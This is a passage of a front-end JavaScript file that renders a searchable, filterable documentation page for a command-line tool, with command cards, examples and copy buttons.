      <pre><code>${escapeHtml(group.commands.join('\n'))}</code></pre>
    </article>
  `).join('');
}

function renderCommandFilters() {
  const categories = ['All', ...Array.from(new Set(commands.map(command => command.category))).sort()];
  const root = document.getElementById('commandFilters');
  root.innerHTML = categories
    .map((category, index) => `<button class="filter-chip ${index === 0 ? 'active' : ''}" type="button" data-category="${escapeHtml(category)}">${escapeHtml(category)}</button>`)
    .join('');
}

function commandCard(command) {
  return `
    <article class="command-card searchable" data-category="${escapeHtml(command.category)}" data-search="${escapeHtml([command.name, command.aliases.join(' '), command.summary, command.examples.join(' ')].join(' '))}">
      <div class="command-title">
        <div>
          <code>${escapeHtml(command.name)}</code>
          ${command.aliases.length ? `<div class="aliases">Aliases: ${escapeHtml(command.aliases.join(', '))}</div>` : ''}
        </div>
        <span class="category">${escapeHtml(command.category)}</span>
      </div>
      <p>${escapeHtml(command.summary)}</p>
      <pre><code>${escapeHtml(command.examples.join('\n'))}</code></pre>
    </article>
  `;
}

function renderCommands(category = 'All') {
  const root = document.getElementById('commandGrid');
  const active = category === 'All' ? commands : commands.filter(command => command.category === category);
  root.innerHTML = active.length ? active.map(commandCard).join('') : '<div class="empty-state">No commands match this filter.</div>';
  applySearch();
  addCopyButtons();
}

function renderSlashGroups() {
  const root = document.getElementById('slashGrid');
  root.innerHTML = slashGroups.map(group => `
    <article class="searchable" data-search="${escapeHtml([group.title, group.text, group.items.join(' ')].join(' '))}">
      <h3>${escapeHtml(group.title)}</h3>
      <p>${escapeHtml(group.text)}</p>
      <div class="tag-row">${group.items.map(item => `<span class="tag">${escapeHtml(item)}</span>`).join('')}</div>
    </article>
  `).join('');
}

function renderProjectFiles() {
  const root = document.getElementById('fileGrid');
  root.innerHTML = projectFiles.map(file => `
    <article class="searchable" data-search="${escapeHtml([file.title, file.text, file.example].join(' '))}">
      <h3>${escapeHtml(file.title)}</h3>
      <p>${escapeHtml(file.text)}</p>
      <pre><code>${escapeHtml(file.example)}</code></pre>
    </article>
  `).join('');
}

function renderExamples() {
  const root = document.getElementById('exampleGrid');
  root.innerHTML = examples.map(example => `
    <article class="example-card searchable" data-search="${escapeHtml([example.title, example.text, example.code].join(' '))}">
      <h3>${escapeHtml(example.title)}</h3>
      <p>${escapeHtml(example.text)}</p>
      <pre><code>${escapeHtml(example.code)}</code></pre>
    </article>
  `).join('');
}

function addCopyButtons() {
  document.querySelectorAll('pre').forEach(pre => {
    if (pre.querySelector('.copy-button')) return;
    const button = document.createElement('button');
    button.type = 'button';
    button.className = 'copy-button';
    button.textContent = 'Copy';
    button.addEventListener('click', async () => {
      const code = pre.querySelector('code')?.innerText ?? '';
      try {
        await navigator.clipboard.writeText(code);
        button.textContent = 'Copied';
        window.setTimeout(() => { button.textContent = 'Copy'; }, 1200);
      } catch {
        button.textContent = 'Select';
        window.setTimeout(() => { button.textContent = 'Copy'; }, 1200);
      }
    });
    pre.appendChild(button);
  });
}

function applySearch() {
  const input = document.getElementById('globalSearch');
  const query = input.value.trim().toLowerCase();
  document.querySelectorAll('.searchable').forEach(card => {
    const haystack = (card.getAttribute('data-search') || card.textContent || '').toLowerCase();
    card.classList.toggle('hidden', query.length > 0 && !haystack.includes(query));
  });
}

function setupFilters() {
  document.getElementById('commandFilters').addEventListener('click', event => {
    const button = event.target.closest('[data-category]');
    if (!button) return;
    document.querySelectorAll('.filter-chip').forEach(chip => chip.classList.remove('active'));
    button.classList.add('active');
    renderCommands(button.dataset.category);
  });
  document.getElementById('clearFilters').addEventListener('click', () => {
    document.querySelectorAll('.filter-chip').forEach((chip, index) => chip.classList.toggle('active', index === 0));
    document.getElementById('globalSearch').value = '';
    renderCommands('All');
    applySearch();
  });
}

function setupNavigation() {
  const links = Array.from(document.querySelectorAll('#sectionNav a'));
  const sections = links
    .map(link => document.querySelector(link.getAttribute('href')))
    .filter(Boolean);
  const observer = new IntersectionObserver(entries => {
    entries.forEach(entry => {
      if (!entry.isIntersecting) return;
      const id = `#${entry.target.id}`;
      links.forEach(link => link.classList.toggle('active', link.getAttribute('href') === id));
    });
  }, { rootMargin: '-30% 0px -55% 0px' });
  sections.forEach(section => observer.observe(section));
}

function setupBackToTop() {
  const button = document.getElementById('backToTop');
  window.addEventListener('scroll', () => {
    button.classList.toggle('visible', window.scrollY > 900);
  }, { passive: true });
  button.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
}

function init() {
  renderFeatureGrid();
  renderCommandFilters();
  renderCommands();
  renderSlashGroups();
  renderProjectFiles();
  renderExamples();
  addCopyButtons();
  setupFilters();
  setupNavigation();
  setupBackToTop();
  document.getElementById('globalSearch').addEventListener('input', applySearch);
}

init();
